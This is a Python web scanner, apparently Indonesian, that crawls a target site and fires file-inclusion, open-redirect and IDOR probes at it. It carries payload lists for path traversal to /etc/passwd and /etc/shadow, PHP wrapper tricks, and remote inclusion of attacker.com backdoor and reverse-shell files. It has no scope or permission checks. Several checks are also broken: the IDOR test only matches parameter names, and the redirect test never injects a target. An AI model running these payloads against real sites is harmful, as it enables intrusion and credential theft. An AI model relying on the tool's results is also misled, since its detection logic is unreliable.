import argparse
import requests
import concurrent.futures
from urllib.parse import urljoin, urlparse
import time
import os
from bs4 import BeautifulSoup

# Payloads LFI dan RFI
lfi_payloads = {
    "basic": [
        "../../../etc/passwd", "../../../../etc/passwd", "../../../../../../etc/passwd",
        "/etc/passwd", "/etc/hostname", "/etc/issue", "/etc/shadow", "/etc/mysql/my.cnf",
        "/etc/httpd/conf/httpd.conf", "/etc/apache2/apache2.conf", "/proc/self/environ",
        "/var/log/apache2/access.log", "/var/log/httpd/access_log", "/var/log/nginx/access.log",
        "/var/www/html/index.html", "../../../../var/log/apache2/error.log", "../../../../var/log/httpd/error_log"
    ],
    "null_byte": [
        "../../../etc/passwd%00", "../../../../etc/passwd%00", "../../../../../../etc/passwd%00"
    ],
    "log_poisoning": [
        "../../../../var/log/apache2/access.log", "../../../../var/log/nginx/access.log",
        "../../../../var/log/httpd/access_log"
    ],
    "filter_bypass": [
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..%5C..%5C..%5C..%5Cetc%5Cpasswd",
        "..%2F%2F%2F..%2Fetc%2Fpasswd", "..%252F..%252F..%252F..%252Fetc%252Fpasswd"
    ],
    "php_wrapper": [
        "php://filter/convert.base64-encode/resource=../../../etc/passwd",
        "php://input", "php://stdin", "php://stderr", "php://stdout", "php://filter/convert.base64-encode/resource=../../../../../../etc/passwd"
    ],
    "double_url_encoding": [
        "..%252F..%252F..%252F..%252Fetc%252Fpasswd"
    ],
    "extended_traversal": [
        "../../../../../../../../etc/passwd"
    ]
}

rfi_payloads = {
    "basic": [
        "http://example.com/shell.php",  # Basic RFI payload with remote shell
        "http://attacker.com/malicious_file.php",
        "http://attacker.com/shell.txt",
        "http://example.com/evil_script.php",
        "http://example.com/evil_shell.php"
    ],
    "file_inclusion": [
        "http://attacker.com/../../../../../../etc/passwd",  # Path traversal with RFI
        "http://attacker.com/../../../../../../etc/shadow",
        "http://attacker.com/../../../../../../var/log/apache2/access.log",  # Log poisoning with RFI
        "http://attacker.com/../../../../../../var/log/nginx/access.log",
        "http://attacker.com/../../../../../../var/log/syslog"
    ],
    "url_encoded": [
        "http%3A%2F%2Fattacker.com%2Fmalicious_file.php",  # URL encoded RFI payload
        "http%3A%2F%2Fattacker.com%2Fevil_script.php",
        "http%253A%252F%252Fattacker.com%252Fevil_shell.php",  # Double URL encoded
        "http%253A%252F%252Fattacker.com%252Fevil_payload.php"  # Double URL encoded RFI
    ],
    "php_injection": [
        "http://attacker.com/index.php?page=http://attacker.com/malicious_file.php",  # PHP wrapper injection
        "http://attacker.com/index.php?file=http://attacker.com/malicious.php",
        "http://attacker.com/index.php?include=http://attacker.com/malicious_payload.php"
    ],
    "backdoor_injection": [
        "http://attacker.com/index.php?page=http://attacker.com/backdoor.php",  # Injecting backdoor via RFI
        "http://attacker.com/index.php?file=http://attacker.com/reverse_shell.php",
        "http://attacker.com/index.php?include=http://attacker.com/shell.php"
    ],
    "protocol_wrappers": [
        "php://input",  # PHP wrapper
        "php://filter/read=string.rot13/resource=index.php",  # PHP filter
        "php://filter/read=convert.base64-encode/resource=index.php",  # Base64 encoding
        "php://stdin",  # STDIN wrapper
        "php://stdout",  # STDOUT wrapper
        "file://etc/passwd"  # File wrapper
    ],
    "log_poisoning": [
        "http://attacker.com/../../../../../../var/log/apache2/error.log",  # Poisoning log files with RFI
        "http://attacker.com/../../../../../../var/log/nginx/error.log",
        "http://attacker.com/../../../../../../var/log/syslog"
    ],
    "reversed_shell": [
        "http://attacker.com/reverse_shell.php",  # Reverse shell RFI
        "http://attacker.com/evil_script_reverse_shell.php",
        "http://attacker.com/shell_reverse.php",
        "http://attacker.com/reverse.php"
    ],
    "null_byte": [
        "http://attacker.com/malicious_file.php%00",  # Null byte in RFI
        "http://attacker.com/evil_script.php%00",
        "http://attacker.com/backdoor.php%00"
    ],
    "wildcard": [
        "http://attacker.com/*",  # Wildcard character to include all files from the server
        "http://attacker.com/*.php",  # Include all PHP files
        "http://attacker.com/*.jpg",  # Wildcard for all JPG images
        "http://attacker.com/*.log"  # Wildcard for log files
    ],
    "extended_traversal": [
        "http://attacker.com/../../../../../../../../etc/passwd",  # Extended path traversal with RFI
        "http://attacker.com/../../../../../../../../etc/shadow",
        "http://attacker.com/../../../../../../../../var/log/nginx/access.log"
    ]
}

params_to_test = [
    'id', 'user', 'username', 'name', 'passwd', 'password', 'email', 'token', 'session', 'key', 'account', 
    'profile', 'data', 'status', 'role', 'privilege', 'access', 'auth', 'login', 'logout', 'reset', 'search',
    'update', 'delete', 'edit', 'admin', 'register', 'verify', 'confirm', 'upload', 'download', 'file', 
    'redirect', 'url', 'action', 'order', 'ref', 'src', 'dest', 'callback', 'return', 'forward', 'redirect_uri', 
    'next', 'target', 'location', 'link', 'path', 'directory', 'view', 'load', 'lang', 'type', 'step', 
    'config', 'doc', 'image', 'icon', 'theme', 'app', 'module', 'plugin', 'template', 'style', 'filter', 
    'referrer', 'from', 'goto', 'back', 'previous', 'subdir', 'login_redirect', 'file', 'uploadfile', 'page', 
    'folder', 'dir', 'download', 'view', 'preview', 'query', 'action', 'lang', 'category', 'type', 'sort', 
    'page_size', 'limit', 'range', 'start', 'finish', 'search_term', 's', 'm', 'method', 'form', 'target', 
    'section', 'category_id', 'item_id', 'product_id', 'user_id', 'file_id', 'file_path', 'username_or_email', 
    'email_or_user', 'zip', 'download_file', 'viewfile', 'doc_id', 'template_id', 'article_id', 'product', 
    'item', 'file_extension', 'uploadfile', 'url_param', 'access_key', 'hash', 'meta', 'referer', 'cookie', 
    'redirect_url', 'request', 'request_uri', 'target_url'
]

REQUESTS_PER_SECOND = 20
DELAY_BETWEEN_REQUESTS = 1 / REQUESTS_PER_SECOND

def print_banner():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")  # Clear terminal screen
    banner = """
    github:holmabeer<3

    ██╗██████╗░██████╗░░█████╗░██████╗░
    ██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗
    ██║██║░░██║██████╔╝██║░░██║██████╔╝
    ██║██║░░██║██╔══██╗██║░░██║██╔══██╗
    ██║██████╔╝██║░░██║╚█████╔╝██║░░██║
    ╚═╝╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
    By: Holmabeer²            goodluck
    ig arrayzzz_            
    """
    print(banner)
    print("Melakukan pengecekan kerentanan...")

def crawl(url, depth=2, visited=None):
    if visited is None:
        visited = set()
    if url in visited or depth == 0:
        return visited
    visited.add(url)
    print(f"Crawling URL: {url}")
    
    try:
        response = requests.get(url)
        if 'text/html' in response.headers.get('Content-Type', '').lower():
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a', href=True)
            for link in links:
                full_url = urljoin(url, link.get('href', ''))
                if urlparse(full_url).netloc == urlparse(url).netloc:
                    crawl(full_url, depth-1, visited)
    except requests.exceptions.RequestException as e:
        print(f"Error crawling {url}: {e}")
    return visited

def test_idor(url):
    found_params = []
    query_string = url.split('?')[1] if '?' in url else ''
    for param in params_to_test:
        if param in query_string:
            found_params.append(param)
    return found_params

def test_redirect(url, redirect_url="https://google.com"):
    headers = {'Origin': 'https://evil.com', 'User-Agent': 'Mozilla/5.0'}
    try:
        response = requests.get(url, headers=headers, allow_redirects=True)
        if response.url == redirect_url:
            return True, response.url
        else:
            return False, response.url
    except requests.exceptions.RequestException as e:
        return False, str(e)

def test_file_inclusion(url):
    found_params = []
    for param in lfi_payloads['basic']:
        lfi_test_url = f"{url}&file={param}"
        try:
            lfi_response = requests.get(lfi_test_url, timeout=5)
            if "root:" in lfi_response.text:
                found_params.append(f"LFI detected with {param}")
        except requests.exceptions.RequestException:
            pass
    for param in rfi_payloads['basic']:
        rfi_test_url = f"{url}&file={param}"
        try:
            rfi_response = requests.get(rfi_test_url, timeout=5)
            if rfi_response.status_code == 200 and "malicious_file" in rfi_response.text:
                found_params.append(f"RFI detected with {param}")
        except requests.exceptions.RequestException:
            pass
    return found_params

def test_all_checks(url):
    idor_found = test_idor(url)
    redirect_success, redirect_url = test_redirect(url)
    file_inclusion_result = test_file_inclusion(url)
    results = []
    
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"[INFO] 200 OK for {url}")
        elif response.status_code == 403:
            print(f"[INFO] 403 Forbidden at {url}")
        elif response.status_code == 404:
            print(f"[INFO] 404 Not Found at {url}")
        elif response.status_code == 500:
            print(f"[INFO] 500 Internal Server Error at {url}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed for {url}: {e}")
    
    if idor_found:
        results.append(f"found IDOR vulnerability with {', '.join(idor_found)}")
    if redirect_success:
        results.append(f"found redirect at {redirect_url}")
    if file_inclusion_result:
        results.append(f"found file inclusion vulnerability ({', '.join(file_inclusion_result)})")
    
    if results:
        print(f"[!!!] {', '.join(results)} at URL: {url}")
    else:
        print(f"[INFO] no vulnerabilities found at {url}")

def worker(url, checks):
    if checks == "redirect":
        test_redirect(url)
    elif checks == "idor":
        test_idor(url)
    elif checks == "file_inclusion":
        test_file_inclusion(url)
    else:
        test_all_checks(url)
    time.sleep(DELAY_BETWEEN_REQUESTS)

def main():
    print_banner()
    time.sleep(2)

    parser = argparse.ArgumentParser(description="Cek kerentanan IDOR, Redirect, dan File Inclusion (RFI/LFI) pada URL.")
    parser.add_argument('-u', '--url', type=str, help="URL utama untuk diuji.")
    parser.add_argument('-f', '--file', type=str, help="File teks berisi daftar URL untuk diuji.")
    parser.add_argument('-d', '--depth', type=int, default=2, help="Kedalaman crawling.")
    parser.add_argument('-r', '--redirect', action='store_true', help="Hanya cek kerentanan Redirect.")
    parser.add_argument('-i', '--idor', action='store_true', help="Hanya cek kerentanan IDOR.")
    parser.add_argument('-fi', '--file_inclusion', action='store_true', help="Hanya cek kerentanan LFI/RFI.")
    parser.add_argument('-a', '--all', action='store_true', help="Lakukan semua pengecekan.")
    args = parser.parse_args()

    urls = []
    if args.url:
        urls.append(args.url)
    if args.file:
        try:
            with open(args.file, 'r') as file:
                urls.extend([line.strip() for line in file if line.strip()])
        except FileNotFoundError:
            print(f"[ERROR] File '{args.file}' tidak ditemukan.")
            return
        except Exception as e:
            print(f"[ERROR] Gagal membaca file '{args.file}': {e}")
            return

    if not urls:
        print("[ERROR] Tidak ada URL yang diberikan untuk diuji. Gunakan -u atau -f untuk memberikan URL.")
        return

    visited_urls = set()
    for url in urls:
        visited_urls.update(crawl(url, args.depth))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=REQUESTS_PER_SECOND) as executor:
        executor.map(lambda url: worker(url, "redirect" if args.redirect else 
                                        "idor" if args.idor else 
                                        "file_inclusion" if args.file_inclusion else "all"), visited_urls)

if __name__ == "__main__":
    main()
